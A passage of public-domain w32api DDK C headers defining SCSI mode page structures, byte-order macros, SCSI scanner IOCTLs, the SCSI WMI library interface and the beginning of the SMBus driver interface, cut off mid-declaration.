  UCHAR MotorOnDelay;
  UCHAR MotorOffDelay;
  UCHAR Reserved2:5;
  UCHAR MotorOnAsserted:1;
  UCHAR StartSectorNumber:1;
  UCHAR TrueReadySignal:1;
  UCHAR StepPlusePerCyclynder:4;
  UCHAR Reserved3:4;
  UCHAR WriteCompenstation;
  UCHAR HeadLoadDelay;
  UCHAR HeadUnloadDelay;
  UCHAR Pin2Usage:4;
  UCHAR Pin34Usage:4;
  UCHAR Pin1Usage:4;
  UCHAR Pin4Usage:4;
  UCHAR MediumRotationRate[2];
  UCHAR Reserved4[2];
} MODE_FLEXIBLE_DISK_PAGE, *PMODE_FLEXIBLE_DISK_PAGE;

typedef struct _MODE_FORMAT_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR TracksPerZone[2];
  UCHAR AlternateSectorsPerZone[2];
  UCHAR AlternateTracksPerZone[2];
  UCHAR AlternateTracksPerLogicalUnit[2];
  UCHAR SectorsPerTrack[2];
  UCHAR BytesPerPhysicalSector[2];
  UCHAR Interleave[2];
  UCHAR TrackSkewFactor[2];
  UCHAR CylinderSkewFactor[2];
  UCHAR Reserved2:4;
  UCHAR SurfaceFirst:1;
  UCHAR RemovableMedia:1;
  UCHAR HardSectorFormating:1;
  UCHAR SoftSectorFormating:1;
  UCHAR Reserved3[3];
} MODE_FORMAT_PAGE, *PMODE_FORMAT_PAGE;

typedef struct _MODE_RIGID_GEOMETRY_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR NumberOfCylinders[3];
  UCHAR NumberOfHeads;
  UCHAR StartWritePrecom[3];
  UCHAR StartReducedCurrent[3];
  UCHAR DriveStepRate[2];
  UCHAR LandZoneCyclinder[3];
  UCHAR RotationalPositionLock:2;
  UCHAR Reserved2:6;
  UCHAR RotationOffset;
  UCHAR Reserved3;
  UCHAR RoataionRate[2];
  UCHAR Reserved4[2];
} MODE_RIGID_GEOMETRY_PAGE, *PMODE_RIGID_GEOMETRY_PAGE;

typedef struct _MODE_READ_WRITE_RECOVERY_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved1:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR DCRBit:1;
  UCHAR DTEBit:1;
  UCHAR PERBit:1;
  UCHAR EERBit:1;
  UCHAR RCBit:1;
  UCHAR TBBit:1;
  UCHAR ARRE:1;
  UCHAR AWRE:1;
  UCHAR ReadRetryCount;
  UCHAR Reserved4[4];
  UCHAR WriteRetryCount;
  UCHAR Reserved5[3];
} MODE_READ_WRITE_RECOVERY_PAGE, *PMODE_READ_WRITE_RECOVERY_PAGE;

typedef struct _MODE_READ_RECOVERY_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved1:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR DCRBit:1;
  UCHAR DTEBit:1;
  UCHAR PERBit:1;
  UCHAR Reserved2:1;
  UCHAR RCBit:1;
  UCHAR TBBit:1;
  UCHAR Reserved3:2;
  UCHAR ReadRetryCount;
  UCHAR Reserved4[4];
} MODE_READ_RECOVERY_PAGE, *PMODE_READ_RECOVERY_PAGE;

typedef struct _MODE_INFO_EXCEPTIONS {
  UCHAR PageCode:6;
  UCHAR Reserved1:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  _ANONYMOUS_UNION union {
    UCHAR Flags;
    _ANONYMOUS_STRUCT struct {
      UCHAR LogErr:1;
      UCHAR Reserved2:1;
      UCHAR Test:1;
      UCHAR Dexcpt:1;
      UCHAR Reserved3:3;
      UCHAR Perf:1;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  UCHAR ReportMethod:4;
  UCHAR Reserved4:4;
  UCHAR IntervalTimer[4];
  UCHAR ReportCount[4];
} MODE_INFO_EXCEPTIONS, *PMODE_INFO_EXCEPTIONS;

typedef struct _POWER_CONDITION_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR Reserved2;
  UCHAR Standby:1;
  UCHAR Idle:1;
  UCHAR Reserved3:6;
  UCHAR IdleTimer[4];
  UCHAR StandbyTimer[4];
} POWER_CONDITION_PAGE, *PPOWER_CONDITION_PAGE;

typedef struct _CDDA_OUTPUT_PORT {
  UCHAR ChannelSelection:4;
  UCHAR Reserved:4;
  UCHAR Volume;
} CDDA_OUTPUT_PORT, *PCDDA_OUTPUT_PORT;

typedef struct _CDAUDIO_CONTROL_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR Reserved2:1;
  UCHAR StopOnTrackCrossing:1;
  UCHAR Immediate:1;
  UCHAR Reserved3:5;
  UCHAR Reserved4[3];
  UCHAR Obsolete[2];
  CDDA_OUTPUT_PORT CDDAOutputPorts[4];
} CDAUDIO_CONTROL_PAGE, *PCDAUDIO_CONTROL_PAGE;

typedef struct _CDVD_FEATURE_SET_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR CDAudio[2];
  UCHAR EmbeddedChanger[2];
  UCHAR PacketSMART[2];
  UCHAR PersistantPrevent[2];
  UCHAR EventStatusNotification[2];
  UCHAR DigitalOutput[2];
  UCHAR CDSequentialRecordable[2];
  UCHAR DVDSequentialRecordable[2];
  UCHAR RandomRecordable[2];
  UCHAR KeyExchange[2];
  UCHAR Reserved2[2];
} CDVD_FEATURE_SET_PAGE, *PCDVD_FEATURE_SET_PAGE;

typedef struct _CDVD_INACTIVITY_TIMEOUT_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR Reserved2[2];
  UCHAR SWPP:1;
  UCHAR DISP:1;
  UCHAR Reserved3:6;
  UCHAR Reserved4;
  UCHAR GroupOneMinimumTimeout[2];
  UCHAR GroupTwoMinimumTimeout[2];
} CDVD_INACTIVITY_TIMEOUT_PAGE, *PCDVD_INACTIVITY_TIMEOUT_PAGE;

typedef struct _CDVD_CAPABILITIES_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PSBit:1;
  UCHAR PageLength;
  UCHAR CDRRead:1;
  UCHAR CDERead:1;
  UCHAR Method2:1;
  UCHAR DVDROMRead:1;
  UCHAR DVDRRead:1;
  UCHAR DVDRAMRead:1;
  UCHAR Reserved2:2;
  UCHAR CDRWrite:1;
  UCHAR CDEWrite:1;
  UCHAR TestWrite:1;
  UCHAR Reserved3:1;
  UCHAR DVDRWrite:1;
  UCHAR DVDRAMWrite:1;
  UCHAR Reserved4:2;
  UCHAR AudioPlay:1;
  UCHAR Composite:1;
  UCHAR DigitalPortOne:1;
  UCHAR DigitalPortTwo:1;
  UCHAR Mode2Form1:1;
  UCHAR Mode2Form2:1;
  UCHAR MultiSession:1;
  UCHAR BufferUnderrunFree:1;
  UCHAR CDDA:1;
  UCHAR CDDAAccurate:1;
  UCHAR RWSupported:1;
  UCHAR RWDeinterleaved:1;
  UCHAR C2Pointers:1;
  UCHAR ISRC:1;
  UCHAR UPC:1;
  UCHAR ReadBarCodeCapable:1;
  UCHAR Lock:1;
  UCHAR LockState:1;
  UCHAR PreventJumper:1;
  UCHAR Eject:1;
  UCHAR Reserved6:1;
  UCHAR LoadingMechanismType:3;
  UCHAR SeparateVolume:1;
  UCHAR SeperateChannelMute:1;
  UCHAR SupportsDiskPresent:1;
  UCHAR SWSlotSelection:1;
  UCHAR SideChangeCapable:1;
  UCHAR RWInLeadInReadable:1;
  UCHAR Reserved7:2;
  _ANONYMOUS_UNION union {
    UCHAR ReadSpeedMaximum[2];
    UCHAR ObsoleteReserved[2];
  } DUMMYUNIONNAME;
  UCHAR NumberVolumeLevels[2];
  UCHAR BufferSize[2];
  _ANONYMOUS_UNION union {
    UCHAR ReadSpeedCurrent[2];
    UCHAR ObsoleteReserved2[2];
  } DUMMYUNIONNAME2;
  UCHAR ObsoleteReserved3;
  UCHAR Reserved8:1;
  UCHAR BCK:1;
  UCHAR RCK:1;
  UCHAR LSBF:1;
  UCHAR Length:2;
  UCHAR Reserved9:2;
  _ANONYMOUS_UNION union {
    UCHAR WriteSpeedMaximum[2];
    UCHAR ObsoleteReserved4[2];
  } DUMMYUNIONNAME3;
  _ANONYMOUS_UNION union {
    UCHAR WriteSpeedCurrent[2];
    UCHAR ObsoleteReserved11[2];
  } DUMMYUNIONNAME4;
  _ANONYMOUS_UNION union {
    UCHAR CopyManagementRevision[2];
    UCHAR Reserved10[2];
  } DUMMYUNIONNAME5;
} CDVD_CAPABILITIES_PAGE, *PCDVD_CAPABILITIES_PAGE;

typedef struct _LUN_LIST {
  UCHAR LunListLength[4];
  UCHAR Reserved[4];
  UCHAR Lun[0][8];
} LUN_LIST, *PLUN_LIST;

typedef struct _MODE_PARM_READ_WRITE {
  MODE_PARAMETER_HEADER ParameterListHeader;
  MODE_PARAMETER_BLOCK ParameterListBlock;
} MODE_PARM_READ_WRITE_DATA, *PMODE_PARM_READ_WRITE_DATA;

typedef struct _PORT_OUTPUT {
  UCHAR ChannelSelection;
  UCHAR Volume;
} PORT_OUTPUT, *PPORT_OUTPUT;

typedef struct _AUDIO_OUTPUT {
  UCHAR CodePage;
  UCHAR ParameterLength;
  UCHAR Immediate;
  UCHAR Reserved[2];
  UCHAR LbaFormat;
  UCHAR LogicalBlocksPerSecond[2];
  PORT_OUTPUT PortOutput[4];
} AUDIO_OUTPUT, *PAUDIO_OUTPUT;

/* Atapi 2.5 changers */
typedef struct _MECHANICAL_STATUS_INFORMATION_HEADER {
  UCHAR CurrentSlot:5;
  UCHAR ChangerState:2;
  UCHAR Fault:1;
  UCHAR Reserved:5;
  UCHAR MechanismState:3;
  UCHAR CurrentLogicalBlockAddress[3];
  UCHAR NumberAvailableSlots;
  UCHAR SlotTableLength[2];
} MECHANICAL_STATUS_INFORMATION_HEADER, *PMECHANICAL_STATUS_INFORMATION_HEADER;

typedef struct _SLOT_TABLE_INFORMATION {
  UCHAR DiscChanged:1;
  UCHAR Reserved:6;
  UCHAR DiscPresent:1;
  UCHAR Reserved2[3];
} SLOT_TABLE_INFORMATION, *PSLOT_TABLE_INFORMATION;

typedef struct _MECHANICAL_STATUS {
  MECHANICAL_STATUS_INFORMATION_HEADER MechanicalStatusHeader;
  SLOT_TABLE_INFORMATION SlotTableInfo[1];
} MECHANICAL_STATUS, *PMECHANICAL_STATUS;

/* Tape definitions */
typedef struct _TAPE_POSITION_DATA {
  UCHAR Reserved1:2;
  UCHAR BlockPositionUnsupported:1;
  UCHAR Reserved2:3;
  UCHAR EndOfPartition:1;
  UCHAR BeginningOfPartition:1;
  UCHAR PartitionNumber;
  USHORT Reserved3;
  UCHAR FirstBlock[4];
  UCHAR LastBlock[4];
  UCHAR Reserved4;
  UCHAR NumberOfBlocks[3];
  UCHAR NumberOfBytes[4];
} TAPE_POSITION_DATA, *PTAPE_POSITION_DATA;

/* This structure is used to convert little endian ULONGs
   to SCSI CDB big endians values. */
typedef union _EIGHT_BYTE {
  _ANONYMOUS_STRUCT struct {
    UCHAR Byte0;
    UCHAR Byte1;
    UCHAR Byte2;
    UCHAR Byte3;
    UCHAR Byte4;
    UCHAR Byte5;
    UCHAR Byte6;
    UCHAR Byte7;
  } DUMMYSTRUCTNAME;
  ULONGLONG AsULongLong;
} EIGHT_BYTE, *PEIGHT_BYTE;

typedef union _FOUR_BYTE {
  _ANONYMOUS_STRUCT struct {
    UCHAR Byte0;
    UCHAR Byte1;
    UCHAR Byte2;
    UCHAR Byte3;
  } DUMMYSTRUCTNAME;
  ULONG AsULong;
} FOUR_BYTE, *PFOUR_BYTE;

typedef union _TWO_BYTE {
  _ANONYMOUS_STRUCT struct {
    UCHAR Byte0;
    UCHAR Byte1;
  } DUMMYSTRUCTNAME;
  USHORT AsUShort;
} TWO_BYTE, *PTWO_BYTE;

/* Byte reversing macro for converting between
   big- and little-endian formats */
#define REVERSE_BYTES_QUAD(Destination, Source) { \
  PEIGHT_BYTE _val1 = (PEIGHT_BYTE)(Destination); \
  PEIGHT_BYTE _val2 = (PEIGHT_BYTE)(Source); \
  _val1->Byte7 = _val2->Byte0; \
  _val1->Byte6 = _val2->Byte1; \
  _val1->Byte5 = _val2->Byte2; \
  _val1->Byte4 = _val2->Byte3; \
  _val1->Byte3 = _val2->Byte4; \
  _val1->Byte2 = _val2->Byte5; \
  _val1->Byte1 = _val2->Byte6; \
  _val1->Byte0 = _val2->Byte7; \
}

#define REVERSE_BYTES(Destination, Source) { \
  PFOUR_BYTE _val1 = (PFOUR_BYTE)(Destination); \
  PFOUR_BYTE _val2 = (PFOUR_BYTE)(Source); \
  _val1->Byte3 = _val2->Byte0; \
  _val1->Byte2 = _val2->Byte1; \
  _val1->Byte1 = _val2->Byte2; \
  _val1->Byte0 = _val2->Byte3; \
}

#define REVERSE_BYTES_SHORT(Destination, Source) { \
  PTWO_BYTE _val1 = (PTWO_BYTE)(Destination); \
  PTWO_BYTE _val2 = (PTWO_BYTE)(Source); \
  _val1->Byte1 = _val2->Byte0; \
  _val1->Byte0 = _val2->Byte1; \
}

#define REVERSE_SHORT(Short) { \
  UCHAR _val; \
  PTWO_BYTE _val2 = (PTWO_BYTE)(Short); \
  _val = _val2->Byte0; \
  _val2->Byte0 = _val2->Byte1; \
  _val2->Byte1 = _val; \
}

#define REVERSE_LONG(Long) { \
  UCHAR _val; \
  PFOUR_BYTE _val2 = (PFOUR_BYTE)(Long); \
  _val = _val2->Byte3; \
  _val2->Byte3 = _val2->Byte0; \
  _val2->Byte0 = _val; \
  _val = _val2->Byte2; \
  _val2->Byte2 = _val2->Byte1; \
  _val2->Byte1 = _val; \
}

#define WHICH_BIT(Data, Bit) { \
  UCHAR _val; \
  for (_val = 0; _val < 32; _val++) { \
    if (((Data) >> _val) == 1) { \
      break; \
    } \
  } \
  ASSERT(_val != 32); \
  (Bit) = _val; \
}

/* FIXME : This structure doesn't exist in the official header */
typedef struct _MODE_CDROM_WRITE_PARAMETERS_PAGE {
  UCHAR PageLength;
  UCHAR WriteType:4;
  UCHAR TestWrite:1;
  UCHAR LinkSizeValid:1;
  UCHAR BufferUnderrunFreeEnabled:1;
  UCHAR Reserved2:1;
  UCHAR TrackMode:4;
  UCHAR Copy:1;
  UCHAR FixedPacket:1;
  UCHAR MultiSession:2;
  UCHAR DataBlockType:4;
  UCHAR Reserved3:4;
  UCHAR LinkSize;
  UCHAR Reserved4;
  UCHAR HostApplicationCode:6;
  UCHAR Reserved5:2;
  UCHAR SessionFormat;
  UCHAR Reserved6;
  UCHAR PacketSize[4];
  UCHAR AudioPauseLength[2];
  UCHAR Reserved7:7;
  UCHAR MediaCatalogNumberValid:1;
  UCHAR MediaCatalogNumber[13];
  UCHAR MediaCatalogNumberZero;
  UCHAR MediaCatalogNumberAFrame;
  UCHAR Reserved8:7;
  UCHAR ISRCValid:1;
  UCHAR ISRCCountry[2];
  UCHAR ISRCOwner[3];
  UCHAR ISRCRecordingYear[2];
  UCHAR ISRCSerialNumber[5];
  UCHAR ISRCZero;
  UCHAR ISRCAFrame;
  UCHAR ISRCReserved;
  UCHAR SubHeaderData[4];
} MODE_CDROM_WRITE_PARAMETERS_PAGE, *PMODE_CDROM_WRITE_PARAMETERS_PAGE;

#ifdef __cplusplus
}
#endif

#endif /* _NTSCSI_ */

```

`include/ddk/scsiscan.h`:

```h
/*
 * scsiscan.h
 *
 * SCSI scanner driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __SCSISCAN_H
#define __SCSISCAN_H

#ifdef __cplusplus
extern "C" {
#endif

#define IOCTL_SCSISCAN_CMD \
  CTL_CODE(FILE_DEVICE_SCANNER, SCSISCAN_CMD_CODE, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SCSISCAN_LOCKDEVICE \
  CTL_CODE(FILE_DEVICE_SCANNER, SCSISCAN_LOCKDEVICE, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SCSISCAN_SET_TIMEOUT \
  CTL_CODE(FILE_DEVICE_SCANNER, SCSISCAN_SET_TIMEOUT,	METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_SCSISCAN_GET_INFO \
  CTL_CODE(FILE_DEVICE_SCANNER, SCSISCAN_GET_INFO, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SCSISCAN_UNLOCKDEVICE \
  CTL_CODE(FILE_DEVICE_SCANNER, SCSISCAN_UNLOCKDEVICE, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)


/* SCSISCAN_CMD.SrbFlags constants */
#define SRB_FLAGS_DISABLE_SYNCH_TRANSFER  0x00000008
#define SRB_FLAGS_DISABLE_AUTOSENSE       0x00000020
#define SRB_FLAGS_DATA_IN                 0x00000040
#define SRB_FLAGS_DATA_OUT                0x00000080
#define SRB_FLAGS_NO_DATA_TRANSFER        0x00000000

/* SCSISCAN_CMD.pSrbStatus constants */
#define SRB_STATUS_PENDING                  0x00
#define SRB_STATUS_SUCCESS                  0x01
#define SRB_STATUS_ABORTED                  0x02
#define SRB_STATUS_ABORT_FAILED             0x03
#define SRB_STATUS_ERROR                    0x04
#define SRB_STATUS_BUSY                     0x05
#define SRB_STATUS_INVALID_REQUEST          0x06
#define SRB_STATUS_INVALID_PATH_ID          0x07
#define SRB_STATUS_NO_DEVICE                0x08
#define SRB_STATUS_TIMEOUT                  0x09
#define SRB_STATUS_SELECTION_TIMEOUT        0x0A
#define SRB_STATUS_COMMAND_TIMEOUT          0x0B
#define SRB_STATUS_MESSAGE_REJECTED         0x0D
#define SRB_STATUS_BUS_RESET                0x0E
#define SRB_STATUS_PARITY_ERROR             0x0F
#define SRB_STATUS_REQUEST_SENSE_FAILED     0x10
#define SRB_STATUS_NO_HBA                   0x11
#define SRB_STATUS_DATA_OVERRUN             0x12
#define SRB_STATUS_UNEXPECTED_BUS_FREE      0x13
#define SRB_STATUS_PHASE_SEQUENCE_FAILURE   0x14
#define SRB_STATUS_BAD_SRB_BLOCK_LENGTH     0x15
#define SRB_STATUS_REQUEST_FLUSHED          0x16
#define SRB_STATUS_INVALID_LUN              0x20
#define SRB_STATUS_INVALID_TARGET_ID        0x21
#define SRB_STATUS_BAD_FUNCTION             0x22
#define SRB_STATUS_ERROR_RECOVERY           0x23
#define SRB_STATUS_QUEUE_FROZEN             0x40
#define SRB_STATUS_AUTOSENSE_VALID          0x80

#define SRB_STATUS(Status) (Status & ~(SRB_STATUS_AUTOSENSE_VALID | SRB_STATUS_QUEUE_FROZEN))

typedef struct _SCSISCAN_CMD {
  ULONG  Reserved1;
  ULONG  Size;
  ULONG  SrbFlags;
  UCHAR  CdbLength;
  UCHAR  SenseLength;
  UCHAR  Reserved2;
  UCHAR  Reserved3;
  ULONG  TransferLength;
  UCHAR  Cdb[16];
  PUCHAR  pSrbStatus;
  PUCHAR  pSenseBuffer;
} SCSISCAN_CMD, *PSCSISCAN_CMD;

#define MAX_STRING 128

/* SCSISCAN_INFO.Flags constants */
#define SCSISCAN_RESERVED         0x000
#define SCSISCAN_CMD_CODE         0x004
#define SCSISCAN_LOCKDEVICE       0x005
#define SCSISCAN_UNLOCKDEVICE     0x006
#define SCSISCAN_SET_TIMEOUT      0x007
#define SCSISCAN_GET_INFO         0x008

typedef struct _SCSISCAN_INFO {
  ULONG  Size;
  ULONG  Flags;
  UCHAR  PortNumber;
  UCHAR  PathId;
  UCHAR  TargetId;
  UCHAR  Lun;
  UCHAR  AdapterName[MAX_STRING];
  ULONG  Reserved;
} SCSISCAN_INFO, *PSCSISCAN_INFO;

#ifdef __cplusplus
}
#endif

#endif /* __SCSISCAN_H */

```

`include/ddk/scsiwmi.h`:

```h
/*
 * scsiwmi.h
 *
 * SCSI WMILIB interface.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __SCSIWMI_H
#define __SCSIWMI_H

#include "srb.h"

#ifdef __cplusplus
extern "C" {
#endif

#pragma pack(push,4)

typedef struct _SCSIWMI_REQUEST_CONTEXT {
  PVOID  UserContext;
  ULONG  BufferSize;
  PUCHAR  Buffer;
  UCHAR  MinorFunction;
  UCHAR  ReturnStatus;
  ULONG  ReturnSize;
} SCSIWMI_REQUEST_CONTEXT, *PSCSIWMI_REQUEST_CONTEXT;

#ifdef _GUID_DEFINED
# warning _GUID_DEFINED is deprecated, use GUID_DEFINED instead
#endif

#if ! (defined _GUID_DEFINED || defined GUID_DEFINED)
#define GUID_DEFINED
typedef struct _GUID {
    ULONG          Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[ 8 ];
} GUID;
#endif

typedef struct _SCSIWMIGUIDREGINFO {
  LPCGUID  Guid;
  ULONG  InstanceCount;
  ULONG  Flags;
} SCSIWMIGUIDREGINFO, *PSCSIWMIGUIDREGINFO;

typedef UCHAR
(NTAPI *PSCSIWMI_QUERY_REGINFO)(
	IN PVOID  DeviceContext,
	IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
	OUT PWCHAR  *MofResourceName);

typedef BOOLEAN
(NTAPI *PSCSIWMI_QUERY_DATABLOCK)(
  IN PVOID  Context,
  IN PSCSIWMI_REQUEST_CONTEXT  DispatchContext,
  IN ULONG  GuidIndex,
  IN ULONG  InstanceIndex,
  IN ULONG  InstanceCount,
  IN OUT PULONG  InstanceLengthArray,
  IN ULONG  BufferAvail,
  OUT PUCHAR  Buffer);

typedef BOOLEAN
(NTAPI *PSCSIWMI_SET_DATABLOCK)(
  IN PVOID  DeviceContext,
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN ULONG  GuidIndex,
  IN ULONG  InstanceIndex,
  IN ULONG  BufferSize,
  IN PUCHAR  Buffer);

typedef BOOLEAN
(NTAPI *PSCSIWMI_SET_DATAITEM)(
  IN PVOID  DeviceContext,
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN ULONG  GuidIndex,
  IN ULONG  InstanceIndex,
  IN ULONG  DataItemId,
  IN ULONG  BufferSize,
  IN PUCHAR  Buffer);

typedef BOOLEAN
(NTAPI *PSCSIWMI_EXECUTE_METHOD)(
  IN PVOID  DeviceContext,
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN ULONG  GuidIndex,
  IN ULONG  InstanceIndex,
  IN ULONG  MethodId,
  IN ULONG  InBufferSize,
  IN ULONG  OutBufferSize,
  IN OUT PUCHAR  Buffer);

typedef enum _SCSIWMI_ENABLE_DISABLE_CONTROL {
	ScsiWmiEventControl,
	ScsiWmiDataBlockControl
} SCSIWMI_ENABLE_DISABLE_CONTROL;

typedef BOOLEAN
(NTAPI *PSCSIWMI_FUNCTION_CONTROL)(
  IN PVOID  DeviceContext,
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN ULONG  GuidIndex,
  IN SCSIWMI_ENABLE_DISABLE_CONTROL  Function,
  IN BOOLEAN  Enable);

typedef struct _SCSIWMILIB_CONTEXT {
  ULONG  GuidCount;
  PSCSIWMIGUIDREGINFO  GuidList;
  PSCSIWMI_QUERY_REGINFO  QueryWmiRegInfo;
  PSCSIWMI_QUERY_DATABLOCK  QueryWmiDataBlock;
  PSCSIWMI_SET_DATABLOCK  SetWmiDataBlock;
  PSCSIWMI_SET_DATAITEM  SetWmiDataItem;
  PSCSIWMI_EXECUTE_METHOD  ExecuteWmiMethod;
  PSCSIWMI_FUNCTION_CONTROL  WmiFunctionControl;
} SCSI_WMILIB_CONTEXT, *PSCSI_WMILIB_CONTEXT;

SCSIPORTAPI
BOOLEAN
NTAPI
ScsiPortWmiDispatchFunction(
  IN PSCSI_WMILIB_CONTEXT  WmiLibInfo,
  IN UCHAR  MinorFunction,
  IN PVOID  DeviceContext,
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN PVOID  DataPath,
  IN ULONG  BufferSize,
  IN PVOID  Buffer);

#define ScsiPortWmiFireAdapterEvent(  \
  HwDeviceExtension,                  \
  Guid,                               \
  InstanceIndex,                      \
  EventDataSize,                      \
  EventData)                          \
    ScsiPortWmiFireLogicalUnitEvent(  \
	  HwDeviceExtension,                \
	  0xff,                             \
	  0,                                \
	  0,                                \
	  Guid,                             \
	  InstanceIndex,                    \
	  EventDataSize,                    \
	  EventData)

/*
 * ULONG
 * ScsiPortWmiGetReturnSize(
 *   PSCSIWMI_REQUEST_CONTEXT  RequestContext);
 */
#define ScsiPortWmiGetReturnSize(RequestContext) \
  ((RequestContext)->ReturnSize)

/* UCHAR
 * ScsiPortWmiGetReturnStatus(
 *   PSCSIWMI_REQUEST_CONTEXT  RequestContext);
 */
#define ScsiPortWmiGetReturnStatus(RequestContext) \
  ((RequestContext)->ReturnStatus)

SCSIPORTAPI
VOID
NTAPI
ScsiPortWmiPostProcess(
  IN PSCSIWMI_REQUEST_CONTEXT  RequestContext,
  IN UCHAR  SrbStatus,
  IN ULONG  BufferUsed);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWmiFireLogicalUnitEvent(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN LPGUID  Guid,
  IN ULONG  InstanceIndex,
  IN ULONG  EventDataSize,
  IN PVOID  EventData);

#pragma pack(pop)

#ifdef __cplusplus
}
#endif

#endif /* __SCSIWMI_H */

```

`include/ddk/smbus.h`:

```h
/*
 * smbus.h
 *
 * System Management Bus driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __SMBUS_H
#define __SMBUS_H

#ifdef __cplusplus
extern "C" {
#endif

#if !defined(SMBCLASS)
#define SMBCLASSAPI DECLSPEC_IMPORT
#else
#define SMBCLASSAPI
#endif

#define SMB_BUS_REQUEST \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_NEITHER, FILE_ANY_ACCESS)

#define SMB_DEREGISTER_ALARM_NOTIFY \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 2, METHOD_NEITHER, FILE_ANY_ACCESS)

#define SMB_REGISTER_ALARM_NOTIFY \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 1, METHOD_NEITHER, FILE_ANY_ACCESS)


struct _SMB_CLASS;

#define SMB_MAX_DATA_SIZE                 32

/* SMB_REQUEST.Status constants */
#define SMB_STATUS_OK                     0x00
#define SMB_UNKNOWN_FAILURE               0x07
#define SMB_ADDRESS_NOT_ACKNOWLEDGED      0x10
#define SMB_DEVICE_ERROR                  0x11
#define SMB_COMMAND_ACCESS_DENIED         0x12
#define SMB_UNKNOWN_ERROR                 0x13
#define SMB_DEVICE_ACCESS_DENIED          0x17
#define SMB_TIMEOUT                       0x18
#define SMB_UNSUPPORTED_PROTOCOL          0x19
#define SMB_BUS_BUSY                      0x1A

/* SMB_REQUEST.Protocol constants */
#define SMB_WRITE_QUICK                   0x00
#define SMB_READ_QUICK                    0x01
#define SMB_SEND_BYTE                     0x02
#define SMB_RECEIVE_BYTE                  0x03
#define SMB_WRITE_BYTE                    0x04
#define SMB_READ_BYTE                     0x05
#define SMB_WRITE_WORD                    0x06
#define SMB_READ_WORD                     0x07
#define SMB_WRITE_BLOCK                   0x08
#define SMB_READ_BLOCK                    0x09
#define SMB_PROCESS_CALL                  0x0A
#define SMB_MAXIMUM_PROTOCOL              0x0A

typedef struct _SMB_REQUEST {
  UCHAR  Status;
  UCHAR  Protocol;
  UCHAR  Address;
  UCHAR  Command;
  UCHAR  BlockLength;
  UCHAR  Data[SMB_MAX_DATA_SIZE];
} SMB_REQUEST, *PSMB_REQUEST;

typedef VOID
(NTAPI *SMB_ALARM_NOTIFY)(
  PVOID  Context,
  UCHAR  Address,
  USHORT  Data);

typedef struct _SMB_REGISTER_ALARM {
  UCHAR  MinAddress;
  UCHAR  MaxAddress;
  SMB_ALARM_NOTIFY  NotifyFunction;
  PVOID  NotifyContext;
} SMB_REGISTER_ALARM, *PSMB_REGISTER_ALARM;

/* SMB_CLASS.XxxVersion constants */
#define SMB_CLASS_MAJOR_VERSION           0x0001
#define SMB_CLASS_MINOR_VERSION           0x0000

typedef NTSTATUS
